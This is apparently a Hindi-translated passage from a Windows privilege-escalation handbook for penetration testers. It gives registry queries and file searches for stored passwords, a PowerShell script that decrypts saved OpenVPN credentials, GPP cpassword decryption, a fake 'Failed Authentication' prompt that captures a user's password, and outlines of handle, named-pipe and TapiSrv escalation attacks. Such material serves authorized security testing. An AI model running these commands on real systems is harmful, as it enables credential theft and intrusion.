Server configuration और backups को restrictive ACLs से सुरक्षित रखें, जहाँ संभव हो CA signing key को offline रखें, और API roles तथा listener access सीमित करें। [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) और [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/) देखें।

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY एक अलग session manager है। इसका native encrypted store `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` पर हो सकता है, जबकि exported session backup का नाम `sessions-backup.dat` हो सकता है और वह कहीं और stored हो सकता है। [SolarWinds की export guide](https://thwack.solarwinds.com/discussion/comment/115591) के अनुसार, exports password-encrypted होते हैं और उनमें sessions, keys, scripts, tags और relationships शामिल हो सकते हैं; इसका [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) native store की पहचान करता है। पहले file permissions और paths जाँचें। इनमें से कोई भी file मिलने से उसका password पता नहीं चलता, न ही यह साबित होता है कि कोई saved credential अब भी valid है या उसके पास अधिक privileges हैं।

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` में स्टोर किया जा सकता है, इसलिए जाँचें कि उसमें कुछ दिलचस्प है या नहीं:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

यदि आपको उस path के अंदर कोई प्रविष्टि मिलती है, तो संभवतः वह सहेजी गई SSH key होगी। यह encrypted रूप में संग्रहीत होती है, लेकिन इसे [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से decrypt किया जा सकता है।\
इस तकनीक के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह boot पर अपने आप शुरू हो, तो चलाएँ:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के ज़रिए किसी मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के इस्तेमाल की पहचान नहीं की।

### अनअटेंडेड फ़ाइलें

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM और SYSTEM बैकअप

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

पढ़ी जा सकने वाली Windows Imaging (`.wim`) बैकअप फ़ाइलों में ऑफ़लाइन `SAM`, `SECURITY` और `SYSTEM` हाइव भी हो सकते हैं। स्थानीय रूप से सुलभ बैकअप या इमेज डायरेक्टरी को प्राथमिकता दें और कुछ भी extract करने से पहले इमेज के **member names** की जाँच करें; सिर्फ़ `.wim` फ़ाइलनाम से यह साबित नहीं होता कि हाइव मौजूद हैं, और सामान्य `install.wim`, `boot.wim` तथा recovery images अक्सर गलत सुराग़ साबित होती हैं। SMB share अलग access path है और उसकी जाँच तभी करें जब वह share दायरे में हो। Microsoft की [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) और [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) देखें।

### क्लाउड क्रेडेंशियल्स

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Password

पहले एक ऐसी सुविधा उपलब्ध थी, जो Group Policy Preferences (GPP) के ज़रिए मशीनों के समूह पर कस्टम स्थानीय administrator accounts तैनात करने देती थी। हालांकि, इस तरीके में सुरक्षा की गंभीर खामियाँ थीं। सबसे पहले, SYSVOL में XML फ़ाइलों के रूप में संग्रहीत Group Policy Objects (GPOs) को कोई भी domain user ऐक्सेस कर सकता था। दूसरे, इन GPPs में मौजूद passwords को AES256 का उपयोग करके एन्क्रिप्ट किया जाता था, लेकिन इसकी default key सार्वजनिक रूप से उपलब्ध थी, इसलिए कोई भी authenticated user इन्हें डिक्रिप्ट कर सकता था। यह एक गंभीर जोखिम था, क्योंकि इससे users को elevated privileges मिल सकते थे।

इस जोखिम को कम करने के लिए एक function बनाया गया, जो ऐसी locally cached GPP files को खोजता है जिनमें खाली न होने वाला "cpassword" field हो। ऐसी फ़ाइल मिलने पर, function password को डिक्रिप्ट करके एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल की location की जानकारी होती है, जिससे इस security vulnerability की पहचान और उसका समाधान करने में मदद मिलती है।

इन फ़ाइलों को `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग करना:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

क्रेडेंशियल्स के साथ web.config का उदाहरण:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot में बैकअप आर्काइव

सीधे serve होने वाले webroot में रखा पुराना ZIP बैकअप पिछली configuration files और दोबारा इस्तेमाल किए जा सकने वाले credentials उजागर कर सकता है। इसे exposure मानने से पहले साइट का configured physical path और यह जाँचें कि archive वास्तव में HTTP के ज़रिए पहुँच योग्य है या नहीं। डिफ़ॉल्ट `C:\inetpub\wwwroot` path केवल एक संभावित path है। एक त्वरित local inventory, archives खोले बिना, उनके नाम और आकार सूचीबद्ध कर सकती है:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

आर्काइव का नाम यह साबित नहीं करता कि उसमें कोई secret है या उससे प्राप्त credential उच्चतर privilege देता है।

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### लॉग्स

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### क्रेडेंशियल्स मांगें

अगर आपको लगता है कि उपयोगकर्ता अपने या किसी दूसरे उपयोगकर्ता के क्रेडेंशियल्स जानता है, तो आप उससे हमेशा उन्हें **दर्ज करने के लिए कह सकते हैं** (ध्यान दें कि क्लाइंट से सीधे **क्रेडेंशियल्स** **मांगना** वाकई **जोखिम भरा** है):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **credentials वाले संभावित फ़ाइलनाम**

ऐसी ज्ञात फ़ाइलें जिनमें पहले **पासवर्ड** **सादे टेक्स्ट** या **Base64** में होते थे

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe एक्सटेंशन के बिना फ़ाइलनाम-सूची वाला संस्करण

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 databases में आमतौर पर `.psafe3` extension का उपयोग होता है। इससे मेल खाने वाले filename को encrypted vault candidate मानें; इसकी मौजूदगी से यह साबित नहीं होता कि आप इसे पढ़ सकते हैं, unlock कर सकते हैं या इसमें stored credentials का उपयोग कर सकते हैं। ऐसी files कहाँ stored हैं, इसकी समीक्षा करते समय accessible user profiles और configured file-sharing roots देखें।

पढ़ने योग्य KeePass `.kdbx` भी केवल एक encrypted-vault lead है। इसे unlock करने के लिए वास्तविक master-password और कोई भी configured key-file या account factors आवश्यक हैं। यदि authorized review में किसी entry में LM:NT hash pair मिलता है, तो [pass-the-hash](../ntlm/README.md#pass-the-hash) पर विचार करने से पहले named account और यह सत्यापित करें कि NT hash वर्तमान है और target की NTLM service उसे स्वीकार करती है। Vault entry अपने-आप Administrator या SYSTEM rights नहीं देती; remote service access, account rights और service-execution का कोई अलग step भी आवश्यक है। Inventory में vault path और readability की जानकारी दें, database या stored credentials प्रिंट न करें।

सभी प्रस्तावित files खोजें:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe extension के बिना Search-command variant

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin में credentials

आपको credentials खोजने के लिए Bin भी देखना चाहिए।

हटाए गए backups और configuration archives के साथ-साथ ऐसी files के लिए भी accessible Recycle Bin entries जाँचें जिनके नाम में स्पष्ट रूप से credentials का उल्लेख हो। कोई उपयोगी `.7z`, `.zip`, या `.rar` backup कई महीने पुराना हो सकता है और उसका filename साधारण हो सकता है। Windows मूल path और deletion time को `$I` record में और हटाई गई file को उसकी paired `$R` entry में रखता है; archive खोलने से पहले metadata और current identity की read access जाँचें। कौन-सी files दिखेंगी, यह volume, user SID और file permissions पर निर्भर करता है, इसलिए खाली listing से यह साबित नहीं होता कि कोई recoverable backup मौजूद नहीं है। Archive के नाम को जाँच के लिए एक candidate मानें, इस बात का प्रमाण नहीं कि उसमें कोई valid secret है।

किसी accessible हटाई गई `.pfx` file से **code-signing** का सुराग भी मिल सकता है। यदि उसमें accessible private key है, तो उस key से बदली हुई PowerShell script sign की जा सकती है; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), और [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Cross-account execution के लिए current identity को उसी exact script में बदलाव करने में सक्षम होना चाहिए, प्रभावी rule को script और target account के लिए बनी signature स्वीकार करनी चाहिए, और कोई scheduled task या अन्य higher-privilege consumer उसे वास्तव में चलाता हो। केवल `.pfx` filename, certificate subject या writable script से यह पूरी शृंखला साबित नहीं होती। Private-key material खोलने या task चलाने से पहले metadata, ACLs, policy और scheduled command की जाँच करें।

Credential से जुड़े सुरागों के लिए accessible messaging-client profile databases, notes और received files की भी जाँच करें। BitLocker recovery export HTML या TXT के रूप में, कभी-कभी किसी नाम वाले backup archive के अंदर, stored हो सकता है। ऐसी सामग्री किसी अलग encrypted data volume तक पहुँच दे सकती है, जिसमें पुराने backups हों; volume और archive की जाँच केवल तभी करें जब आपको इसकी अनुमति हो। यदि किसी backup में `NTDS.dit` है, तो offline domain credential recovery के लिए उससे मेल खाने वाला `SYSTEM` hive भी आवश्यक है, जैसा कि [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md) में बताया गया है। केवल filenames और locked volume से यह साबित नहीं होता कि कोई उपयोगी recovery key या domain backup मौजूद है।

कई programs द्वारा saved **passwords recover** करने के लिए आप इसका उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**Credentials वाली अन्य संभावित registry keys**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**registry से openssh keys निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome या Firefox** के passwords संग्रहीत हैं।\
आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome, Edge या Firefox** के passwords संग्रहीत हैं।\
साथ ही, ब्राउज़रों के इतिहास, bookmarks और favourites भी जाँचें; हो सकता है कि वहाँ कुछ **passwords संग्रहीत हों**।

मौजूदा उपयोगकर्ता के सामान्य Edge **Default** प्रोफ़ाइल के लिए, `Login Data` `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` में होता है, जबकि `Local State` उसकी parent `User Data` directory में होता है। [Microsoft default प्रोफ़ाइल का स्थान बताता है](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); कोई दूसरा प्रोफ़ाइल या `UserDataDir` policy इसे दूसरी जगह ले जा सकती है। फ़ाइल का मौजूद होना केवल credential store का सुराग है: पुष्टि करें कि फ़ाइलें पढ़ी जा सकती हैं, संबंधित उपयोगकर्ता का DPAPI context या अन्य अधिकृत key material उपलब्ध है, और यह कि कोई saved login अधिक privileged account का है। केवल path की enumeration करने के लिए database खोलने या decrypted passwords दिखाने की ज़रूरत नहीं है।

Firefox के लिए, [Mozilla बताता है](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) कि किसी प्रोफ़ाइल की `key4.db` और `logins.json` फ़ाइलें क्रमशः key और encrypted-login फ़ाइलें हैं। उनका मौजूद होना केवल एक सुराग है: जाँचें कि क्या दोनों फ़ाइलें पढ़ी जा सकती हैं, क्या उनमें saved entries मौजूद हैं, और निष्कर्ष निकालने से पहले कि credentials इस्तेमाल किए जा सकते हैं, क्या Primary Password key को सुरक्षित रखता है। अगर कोई recovered credential किसी domain account का है, तो उस account के प्रभावी group-control अधिकारों और समूह के [LAPS password पढ़ने या decrypt करने के अधिकारों](../active-directory-methodology/laps.md) की अलग-अलग समीक्षा करें; केवल browser artifacts से administrator path साबित नहीं होता।

ब्राउज़रों से passwords निकालने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में बनी एक technology है, जो अलग-अलग languages के software components के बीच **intercommunication** की सुविधा देती है। प्रत्येक COM component की पहचान **class ID (CLSID)** से होती है और प्रत्येक component एक या अधिक interfaces के ज़रिए functionality उपलब्ध कराता है, जिनकी पहचान interface IDs (IIDs) से होती है।

COM classes और interfaces क्रमशः registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को merge करके बनाई जाती है।

इस registry के CLSIDs के अंदर आपको child registry **InProcServer32** मिल सकती है, जिसमें एक **default value** होती है जो किसी **DLL** की ओर इंगित करती है, और `ThreadingModel` नाम की एक value होती है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकती है।

![ब्राउज़र इतिहास - COM DLL Overwriting: इस registry के CLSIDs के अंदर आपको child registry InProcServer32 मिल सकती है, जिसमें एक default value होती है जो किसी DLL की ओर इंगित करती है और एक value...](<../../images/image (729).png>)

मूल रूप से, अगर आप निष्पादित होने वाली किसी भी **DLL को overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं, यदि उस DLL को किसी दूसरे उपयोगकर्ता द्वारा निष्पादित किया जाना है।

यह जानने के लिए कि हमलावर persistence mechanism के रूप में COM Hijacking का उपयोग कैसे करते हैं, देखें:

{{#ref}}
com-hijacking.md
{{#endref}}

### **फ़ाइलों और registry में सामान्य password खोज**

**फ़ाइलों की सामग्री खोजें**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**किसी विशेष फ़ाइल नाम वाली फ़ाइल खोजें**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**रजिस्ट्री में key names और passwords खोजें**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### पासवर्ड खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है। मैंने इस plugin को victim के अंदर credentials खोजने वाले हर Metasploit POST module को **automatically execute करने** के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस पेज पर बताए गए पासवर्ड वाली सभी files को automatically खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) किसी system से password निकालने के लिए एक और बेहतरीन tool है।

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई tools के **sessions**, **usernames** और **passwords** खोजता है, जो इस data को clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY और RDP)।

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रही कोई process, full access के साथ एक नया process** (`OpenProcess()`) **खोलती है**। वही process **कम privileges के साथ एक नया process** (`CreateProcess()`) **भी बनाती है, जिसे main process के सभी खुले handles विरासत में मिलते हैं**।\
फिर, यदि आपके पास **कम privileges वाले process का full access** है, तो आप `OpenProcess()` से बनाए गए **privileged process के खुले handle** को प्राप्त कर सकते हैं और **shellcode inject कर सकते हैं**।\
[इस vulnerability का पता लगाने और इसका exploit करने के तरीके के बारे में अधिक जानकारी के लिए यह उदाहरण पढ़ें।](leaked-handle-exploitation.md)\
[अलग-अलग permissions वाले processes और threads से विरासत में मिले अन्य खुले handles (सिर्फ full access वाले नहीं) की जांच और दुरुपयोग करने के तरीके की अधिक विस्तृत व्याख्या के लिए यह **अन्य post पढ़ें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, processes के बीच communication और data transfer की सुविधा देते हैं।

Windows में **Named Pipes** नाम का एक feature है, जो असंबंधित processes को अलग-अलग networks पर भी data share करने देता है। यह client/server architecture जैसा है, जिसमें भूमिकाओं को **named pipe server** और **named pipe client** के रूप में परिभाषित किया जाता है।

जब कोई **client** pipe के ज़रिए data भेजता है, तो pipe सेट अप करने वाला **server**, **client की पहचान अपना सकता है**, बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। किसी ऐसे **privileged process** की पहचान करना, जो उस pipe के ज़रिए communicate करता हो जिसकी आप नकल कर सकते हैं, आपको **अधिक privileges हासिल करने** का अवसर देता है—इसके लिए उस process की पहचान अपनाएँ, जब वह आपके बनाए pipe के साथ interact करे। ऐसा attack करने के निर्देशों के लिए उपयोगी guides [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकते हैं।

साथ ही, यह tool burp जैसे tool से **named pipe communication को intercept करने** देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool privescs ढूँढ़ने के लिए सभी pipes की सूची दिखाने और उन्हें देखने देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode में Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) को expose करती है। एक remote authenticated client, mailslot-आधारित async event path का दुरुपयोग करके `ClientAttach` को `NETWORK SERVICE` द्वारा writable किसी भी मौजूदा file पर मनमाना **4-byte write** करने के लिए इस्तेमाल कर सकता है। इसके बाद Telephony admin rights हासिल करके service के रूप में मनमाना DLL load किया जा सकता है। पूरा flow:

- `pszDomainUser` को किसी writable मौजूदा path पर सेट करके `ClientAttach` करें → service उसे `CreateFileW(..., OPEN_EXISTING)` के ज़रिए खोलती है और async event writes के लिए इस्तेमाल करती है।
- हर event, `Initialize` से attacker-नियंत्रित `InitContext` को उस handle पर लिखता है। `LRegisterRequestRecipient` (`Req_Func 61`) से line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` के तहत खुद को जोड़ें, reconnect करें, फिर `NETWORK SERVICE` के रूप में `TSPI_providerUIIdentify` execute करने के लिए मनमाना DLL path देकर `GetUIDllName` call करें।

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows में execute हो सकने वाली File Extensions

**[https://filesec.io/](https://filesec.io/)** page देखें।

### Markdown renderers के ज़रिए Protocol handler / ShellExecute का दुरुपयोग

`ShellExecuteExW` को forward किए गए clickable Markdown links खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और मौजूदा user के रूप में attacker-नियंत्रित files execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Passwords के लिए Command Lines की Monitoring**

